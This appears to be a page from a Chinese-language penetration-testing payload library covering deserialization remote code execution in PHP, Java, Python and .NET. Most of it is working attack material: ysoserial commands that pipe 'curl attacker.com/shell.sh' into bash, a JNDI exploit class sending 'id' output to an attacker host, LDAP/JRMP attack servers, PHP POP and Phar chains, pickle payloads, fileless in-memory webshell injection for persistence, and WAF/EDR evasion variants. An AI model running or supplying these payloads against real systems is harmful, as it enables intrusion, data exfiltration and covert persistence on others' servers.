# RCE — 通用反序列化 payload 库

> 父文档:[00-index.md](00-index.md)
> 通用 PHP / Java 反序列化攻击链。框架相关反序列化(Fastjson / Shiro / WebLogic T3 / ViewState)见 [`10-framework.md`](10-framework.md)。

---

### 反序列化漏洞  `rce-deserialize`
利用反序列化漏洞实现RCE
子类：**反序列化** · tags: `rce` `deserialize` `java` `php`

**前置条件：** 存在反序列化点；存在可利用的Gadget链

**攻击链：**

**1. 1. Java反序列化**
_Java反序列化_
```
# 常见漏洞组件
Apache Commons Collections
Spring Framework
Fastjson
Jackson
WebLogic

# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash"
```

**2. 2. PHP反序列化**
_PHP反序列化_
```
<?php
class Exploit {
    public $cmd = "system('whoami');";
    function __destruct() {
        eval($this->cmd);
    }
}
echo serialize(new Exploit());
?>
生成: O:6:"Exploit":1:{s:3:"cmd";s:17:"system('whoami');";}
```

**3. 3. Python反序列化**
_Python pickle反序列化_
```
import pickle
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))
payload = pickle.dumps(Exploit())
# 发送payload触发反序列化
```

**4. 4. .NET反序列化**  _[windows]_
_.NET反序列化_
```
# 使用ysoserial.net
ysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"

# 常见格式
BinaryFormatter
Json.NET
XMLSerializer
```

**WAF/EDR 绕过变体：**

**1. 签名绕过**
_绕过签名验证_
```
如果存在签名验证
需要获取密钥重新签名
```

---

### PHP反序列化  `rce-deserialize-php`
PHP反序列化漏洞利用技术
子类：**PHP反序列化** · tags: `rce` `php` `deserialize` `unserialize`

**前置条件：** 存在unserialize调用；存在可利用的类

**攻击链：**

**1. 1. 魔术方法**
_PHP魔术方法_
```
__construct() - 对象创建时调用
__destruct() - 对象销毁时调用
__wakeup() - 反序列化时调用
__toString() - 对象转字符串时调用
__call() - 调用不存在方法时触发
```

**2. 2. 构造POP链**
_构造POP链_
```
<?php
class Chain {
    public $obj;
    function __destruct() {
        $this->obj->action();
    }
}
class Action {
    public $cmd;
    function action() {
        system($this->cmd);
    }
}
$payload = new Chain();
$payload->obj = new Action();
$payload->obj->cmd = "whoami";
echo serialize($payload);
?>
```

**3. 3. Phar反序列化**
_Phar反序列化_
```
# 生成Phar文件
<?php
class Exploit {}
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
?>

# 触发反序列化
phar://exploit.phar/test.txt
```

**4. 4. Session反序列化**
_Session反序列化_
```
# 利用Session处理器差异
# php_serialize vs php_binary
构造恶意Session数据触发反序列化
```

**WAF/EDR 绕过变体：**

**1. 属性修饰符绕过**
_属性修饰符处理_
```
使用public/private/protected属性
注意序列化格式差异:
public: s:3:"cmd"
private: s:8:"\0Class\0cmd"
protected: s:7:"\0*\0cmd"
```

---

### Java反序列化  `rce-deserialize-java`
Java反序列化漏洞利用技术
子类：**Java反序列化** · tags: `rce` `java` `deserialize` `ysoserial`

**前置条件：** 存在Java反序列化点；存在Gadget链

**攻击链：**

**1. 1. 识别Java序列化数据**
_从流量/Cookie/参数中识别Java序列化魔术字节_
```
# Java原生序列化魔术字节(hex):
ac ed 00 05                    # 序列化流头
aced0005                       # 连续hex

# Base64编码后的特征:
rO0AB       # base64(ac ed 00 05) → 几乎所有Java序列化base64都以rO0AB开头
rO0         # 短截断也可能出现

# 常见出现位置:
Cookie: rememberMe=rO0ABX...
Cookie: JSESSIONID=rO0ABX...
POST body: rO0ABX...
ViewState: rO0ABX...           # 非.NET ViewState，实为Java序列化
Authorization: Bearer rO0ABX...
自定义Header: X-Auth-Token: rO0ABX...

# 快速检测命令:
echo "<base64_blob>" | base64 -d | xxd | head -1
# 输出 ac ed 00 05 → Java序列化确认
echo "<base64_blob>" | base64 -d 2>/dev/null | head -c 4 | xxd -p
# 输出 aced0005 → 确认
```

**2. 2. Gadget链优先级决策树**
_按目标环境依赖库选择最优Gadget链(优先级从高到低)_
```
# Phase 1: 先做DNS外带探测(无危害、高通过率)
java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn" | base64
# URLDNS 不依赖任何第三方库，纯JDK，适合第一步探测

# Phase 2: 按目标技术栈选择Gadget(优先级=通用性×隐蔽性)
# 优先级1: CommonsCollections系列(最通用，覆盖90%Java应用)
java -jar ysoserial.jar CommonsCollections1 "cmd"     # CC1: JDK <8u71
java -jar ysoserial.jar CommonsCollections5 "cmd"     # CC5: JDK全版本,不需要Transform
java -jar ysoserial.jar CommonsCollections6 "cmd"     # CC6: 不需要Transform,JDK全版本
java -jar ysoserial.jar CommonsCollections7 "cmd"     # CC7: Hashtable触发

# 优先级2: CommonsBeanutils(Spring/Struts2常见依赖)
java -jar ysoserial.jar CommonsBeanutils1 "cmd"       # 需要commons-beanutils

# 优先级3: Spring系列(Spring应用)
java -jar ysoserial.jar Spring1 "cmd"                 # spring-core
java -jar ysoserial.jar Spring2 "cmd"

# 优先级4: JDK原生链(无任何第三方依赖时)
java -jar ysoserial.jar Jdk7u21 "cmd"                 # JDK 7u21以下
java -jar ysoserial.jar JRE8u20 "cmd"                 # JDK 8u20

# 优先级5: 特定框架链
java -jar ysoserial.jar Groovy1 "cmd"                 # Groovy依赖
java -jar ysoserial.jar Hibernate1 "cmd"              # Hibernate依赖
java -jar ysoserial.jar JBossInterceptors1 "cmd"      # JBoss

# 决策流程:
# 1. 能DNS外带 → URLDNS探测，确认反序列化点存在
# 2. 目标有commons-collections 3.x → CC1/CC5/CC6
# 3. 目标有commons-collections 4.x → CC2/CC4(需要commons-collections4)
# 4. 目标有Spring → CommonsBeanutils1 > Spring1/2
# 5. 目标未知依赖 → URLDNS确认后，遍历CC1→CC5→CC6→CC7→CommonsBeanutils1→Jdk7u21
```

**3. 3. JNDI注入利用**
_JNDI注入(配合反序列化或独立使用)_
```
# JNDI注入原理: 反序列化触发JNDI lookup → LDAP/RMI远程类加载 → RCE

# 1. 启动恶意JNDI服务(marshalsec):
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#Exploit 1389
# 或使用JNDIExploit(支持更多payload):
java -jar JNDIExploit.jar -i attacker.com -p 1389

# 2. 准备恶意类(Exploit.class):
# Exploit.java:
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("curl attacker.com/$(id|base64)");
        } catch (Exception e) {}
    }
}
# 托管在 http://attacker.com:8080/Exploit.class

# 3. 触发JNDI注入的常见Gadget:
# JdbcRowSetImpl(最通用):
java -jar ysoserial.jar JdbcRowSetImpl "ldap://attacker.com:1389/Exploit"
# 或手工构造JSON(Fastjson):
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

# 高版本JDK限制:
# JDK 6u211/7u201/8u191/11.0.1+ → 默认 trustURLCodebase=false
# 绕过方式:
# 1. 使用本地ClassPath中的Factory(如BeanFactory)
# 2. 利用RMI而非LDAP(部分版本RMI限制较松)
# 3. 反序列化gadget直接RCE(不依赖远程类加载)
```

**4. 4. JRMP攻击(Java RMI协议利用)**
_JRMP攻击_
```
# JRMPListener(服务端攻击，等待目标连接):
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections1 "touch /tmp/pwned"
# 然后让目标反序列化JRMPClient:
java -jar ysoserial.jar JRMPClient "attacker:4444"

# JRMP反向攻击(目标开启RMI Registry):
# 1. 探测RMI Registry(默认端口1099):
nmap -p 1099 --script rmi-dumpregistry target
# 2. 如果Registry绑定远程对象，可尝试RMI客户端攻击
java -jar ysoserial.jar RMIRegistryExploit target 1099 CommonsCollections1 "id"
```

**5. 5. 内存马注入(无文件落地)**
_内存马注入: 不写webshell，直接在内存中注册handler/filter/servlet_
```
# 适用场景: 反序列化RCE后不需要落地文件的持久化方案
# 优点: 无文件落地、绕过文件监控、重启即消失(隐蔽)

# 1. Filter型内存马(Java Web通用):
# 通过反序列化动态注册Filter到ServletContext
# 工具: Behinder(冰蝎)/Godzilla(哥斯拉)内存马注入模块

# 2. Spring Controller型内存马:
# 动态注册@RequestMapping到Spring ApplicationContext
# 利用Spring4Shell(CVE-2022-22965)或反序列化后注入

# 3. Tomcat Valve/Listener型:
# 动态注册Valve到Tomcat Pipeline，拦截所有请求

# 4. Shiro FilterChain型:
# 在Shiro FilterChain中插入恶意Filter

# 注入工具(yu-userial):
java -jar ysuserial.jar CommonsCollections1 "内存马命令"
# 支持多种内存马类型: filter/servlet/listener/valve
```

**6. 6. 常见端口指纹速查**
_Java中间件反序列化相关端口_
```
| 组件 | 默认端口 | 协议 | 探测方法 |
|------|---------|------|---------|
| WebLogic | 7001(T3/IIOP/HTTP) | T3/IIOP | echo "t3 12.2.1" \| nc target 7001 → HELO |
| WebLogic | 7002(SSL) | T3S/IIOPS | nmap -sV -p 7002 target |
| Tomcat AJP | 8009 | AJP | nmap -sV -p 8009 → ajp13 |
| JBoss | 8080/8443(HTTP) | HTTP | /jmx-console/ /invoker/JMXInvokerServlet |
| JBoss JMX | 1090 | JMX RMI | nmap -sV -p 1090 |
| RMI Registry | 1099 | RMI | nmap --script rmi-dumpregistry -p 1099 |
| Jenkins | 8080 | HTTP | /script /manage /jnlpJars/ |
| Jenkins JNLP | 50000 | JNLP | nmap -sV -p 50000 → Jenkins JNLP |
| Jetty | 8080/8443 | HTTP | Server: Jetty |
| Resin | 8080/8443 | HTTP | Server: Resin |
| GlassFish | 4848(Admin) 8080(HTTP) | HTTP | /common/index.jsf |

# 快速端口扫描命令:
nmap -p 7001,7002,8009,1090,1099,8080,8443,4848,50000 -sV target
```

**WAF/EDR 绕过变体：**

**1. Gadget链混淆与二次反序列化**
_绕过黑名单检测：使用SignedObject二次反序列化、JRMP/RMI代理转发、反射调用隐藏调用链_
```
# 1. 二次反序列化(SignedObject包裹):
# 利用java.security.SignedObject的getObject()内部会二次反序列化
java -jar ysoserial.jar CommonsCollections1 "cmd" | \
  python3 -c "import sys,base64;print(base64.b64encode(open(sys.argv[1],'rb').read()).decode())"

# 2. JRMP代理转发(隐藏真实payload):
# attacker端:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "cmd"
# 向目标发送JRMPClient，目标连接attacker:8888获取真正的gadget执行

# 3. 反射绕过(避开黑名单中的类名):
# 使用ysoserial的JRMPClient/JRMPListener代理模式
# 或使用ysuserial的混淆链

# 4. 链变形:
# CC1→CC5→CC6→CC7 按序尝试
# signedObject二次包裹绕过基于类名的黑名单
```

**2. DNS外带优先原则**
_为避免触发WAF/EDR，优先使用URLDNS gadget仅做DNS外带确认，再逐步升级_
```
# 第一步: URLDNS探测(无危害，几乎不触发告警)
java -jar ysoserial.jar URLDNS "http://{random}.dnslog.cn" | base64
→ DNSLog收到请求 = 反序列化点存在，但不确定能否RCE

# 第二步: 尝试低危命令外带
java -jar ysoserial.jar CommonsCollections5 "nslookup $(whoami).{random}.dnslog.cn" | base64
→ DNSLog收到子域名含用户名 = RCE确认

# 第三步: 评估影响即可(不建议实际反弹shell)
java -jar ysoserial.jar CommonsCollections5 "curl http://attacker.com/$(id|base64)" | base64
```

---


---

← 回 [00-index.md](00-index.md) · 相关:[`10-framework.md`](10-framework.md)(框架反序列化)
